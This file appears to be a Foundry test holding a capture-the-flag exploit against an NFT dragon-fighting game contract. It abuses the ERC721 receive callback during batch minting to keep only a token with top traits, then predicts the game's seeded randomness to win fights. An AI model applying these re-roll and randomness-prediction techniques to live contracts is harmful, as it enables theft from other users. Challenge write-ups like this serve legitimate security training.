// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/NFT.sol";
import "forge-std/console2.sol";

contract ExploitTest is Test {
    address player;
    Exploit exploit; // FIX ME in script
    uint256 legendaryNFTID;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("paradigm"));
        uint256 playerPrivateKey = vm.envUint("PRIVATE_KEY");
        player = vm.addr(playerPrivateKey);
    }

    function testExploit() public {
        vm.startPrank(player);

        Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
        exploit = new Exploit{value: 1000 ether}();
        exploit.run(challenge);

        vm.stopPrank();

        // PRANK watcher!
        random(bytes32(block.timestamp));

        exploit.run1();

        // PRANK watcher!
        random(bytes32(block.timestamp + 100));

        assertTrue(challenge.isSolved());
    }

    function random(bytes32 seed) public {
        Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
        vm.startPrank(challenge.FACTORY().randomnessOperator());
        challenge.TOKEN().resolveRandomness(seed);
        vm.stopPrank();
    }
}

contract Exploit is Test {
    Challenge challenge;
    uint256 legendaryNFTID;
    uint256 round = 10;
    bytes32 seed;

    constructor() payable {}

    function setSeed(bytes32 _seed) public {
        seed = _seed;
    }

    function run(Challenge _challenge) public {
        challenge = _challenge;
        Factory factory = challenge.FACTORY();
        ItemShop itemShop = challenge.ITEMSHOP();
        NFT nft = challenge.TOKEN();

        // Buy equipment
        itemShop.buy{value: 1 ether}(1);
        itemShop.buy{value: 1 ether}(2);
        assertTrue(itemShop.balanceOf(address(this), 1) == 1);
        assertTrue(itemShop.balanceOf(address(this), 2) == 1);
    }

    function run1() public returns (bool) {
        NFT nft = challenge.TOKEN();
        Trait memory trait;
        // Mint
        address[] memory receivers = new address[](round);
        for (uint i = 0; i < receivers.length; i++) {
            receivers[i] = address(this);
        }
        nft.batchMint(receivers);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        if (isBest(_tokenId)) {
            legendaryNFTID = _tokenId;
        }

        // last round
        if (round - 1 == 0) {
            require(legendaryNFTID != 0, "NOT FOUND THE BEST");

            // WHO?
            NFT nft = challenge.TOKEN();
            Trait memory trait = nft.traits(_tokenId);
            console2.log(legendaryNFTID, trait.strength, trait.constitution);

            // Equip
            ItemShop itemShop = challenge.ITEMSHOP();
            itemShop.setApprovalForAll(address(nft), true);
            nft.equip(legendaryNFTID, address(itemShop), 1);
            nft.equip(legendaryNFTID, address(itemShop), 2);

            // Set fight with legendaryNFTID
            nft.fight(uint128(legendaryNFTID), 0);
        }

        round--;

        return
            bytes4(
                keccak256("onERC721Received(address,address,uint256,bytes)")
            );
    }

    function isBest(uint256 _tokenId) public returns (bool) {
        Trait memory trait = challenge.TOKEN().traits(_tokenId);

        return (((trait.strength >> 39) & 1 == 1) &&
            ((trait.strength >> 38) & 1 == 1) &&
            ((trait.constitution >> 39) & 1 == 1) &&
            ((trait.constitution >> 38) & 1 == 1));
    }

    function getInput(
        FighterVars calldata attacker,
        FighterVars calldata attackee
    ) external returns (uint256 inputs) {
        console2.log(attacker.attack, attacker.defense, attacker.health);
        console2.log(attackee.attack, attackee.defense, attackee.health);
        bytes32 dragonInputs = challenge.TOKEN().randomness().generate(seed, 1);
        return ~uint256(dragonInputs);
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return
            bytes4(
                keccak256(
                    "onERC1155Received(address,address,uint256,uint256,bytes)"
                )
            );
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external virtual returns (bytes4) {
        return
            bytes4(
                keccak256(
                    "onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"
                )
            );
    }
}
